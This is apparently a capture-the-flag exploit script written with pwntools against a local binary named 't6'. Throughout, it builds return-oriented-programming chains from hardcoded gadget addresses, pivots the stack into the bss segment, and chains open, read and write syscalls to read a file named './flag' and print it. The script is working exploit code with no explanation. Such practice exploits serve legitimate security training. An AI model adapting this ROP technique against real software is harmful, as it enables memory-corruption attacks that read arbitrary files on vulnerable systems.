from pwn import *
context.log_level='debug'
sh = process('./t6')

bss =  0x405000-0x100
v = 0x401070
a = 0x401055
syscall = 0x4010ad
pop_rdi = 0x401103
pop_rsi_r15 = 0x401101

edi_0_edx_70_eax_0_syscall = 0x401083

sh.recvuntil('pwned!')
payload = p64(0) + p64(bss+0x30)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(edi_0_edx_70_eax_0_syscall) #0x20

sh.send(payload)
sh.recvuntil('Bye')
bp_payload = b'./flag\x00\x00' + b'\x00'*0x28 + p64(v) + p64(v) + p64(v)

sh.sendline(bp_payload)

payload = p64(0) + p64(bss + 0x70)
payload += p64(a) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(syscall) + p64(v) #0x40
sleep(10)

sh.send(payload)

sh.recvuntil('Bye')
sh.recvuntil('Bye')
payload = p64(0) + p64(bss+0xa8)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x401088) + p64(v) #0x30
sh.send(payload)
sleep(11)
#gdb.attach(sh,'b *0x40106d')
sh.recvuntil('Bye')
payload = p64(0) + p64(bss)
payload += p64(a) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x40108d)
sh.send(payload)
sh.interactive()
